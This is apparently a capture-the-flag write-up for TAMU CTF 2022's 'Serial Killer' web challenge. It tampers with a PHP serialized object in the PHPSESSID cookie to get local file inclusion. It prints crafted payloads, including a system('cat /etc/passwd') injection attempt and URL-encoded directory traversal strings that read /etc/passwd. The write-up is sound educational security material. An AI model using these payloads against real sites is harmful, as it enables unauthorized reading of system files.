Serial Killer 

Tamu CTF 2022


Challenge Description:

I'm trying a new way to display files on my website. Can you try to break it for me?

Do not connect with HTTPS, make sure to connect with HTTP

Link: [http://serial.tamuctf.com](http://serial.tamuctf.com/)

Tip: The flag is located in the /etc/passwd file.

Solution:

So the page looks something like this,

![](Aspose.Words.8de23a1c-c73d-4868-acd1-d9bec2c3d94c.001.jpeg)

So, when we checked the cookies, we saw `phpsessid` cookie with encoded value. 

Phpsessid: Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30%3D

When I url decoded and base-64 decoded this string, we get the following:

Url decoded: Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30=

Base-64 decoded: O:7:"GetPage":1:{s:4:"file";s:10:"index.html";}

What we got is nothing but a serialised object. There is some block of code on the server called GetPage and it has a parameter called file that takes in a value index.html which is what we see in  our browser.

So, we are given that the flag is in `etc/passwd`. So, we can try giving `etc/passwd` in the place of `index.html` in the serialised object. So, the string looks like:

O:7:"GetPage":1:{s:4:"file";s:11:"/etc/passwd";}

We can base64 encode it and url encode it and submit in the `phpsessid` cookie, but we get an error message:

![](Aspose.Words.8de23a1c-c73d-4868-acd1-d9bec2c3d94c.002.jpeg)

O:7:"GetPage":1:{s:4:"file";s:26:"system(\'cat+/etc/passwd\');";}

The above string also gave some error.

Then we tried directory traversal and gave the following string:

O:7:"GetPage":1:{s:4:"file";s:25:"../../../../../etc/passwd";}

Surprisingly, the above string also gave an error, then tried url encoding `./../../../../etc/passwd` and giving it into the serialised form,

O:7:"GetPage":1:{s:4:"file";s:46:"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd";}

Then base64 encoded and url encoded this and got the following:

Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6NDY6IiUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZmV0Yy9wYXNzd2QiO30%3D

Submitting this to the `phpsessid` cookie gave us the flag:

Flag:  gigem{1nt3r3sting\_LFI\_vuln}
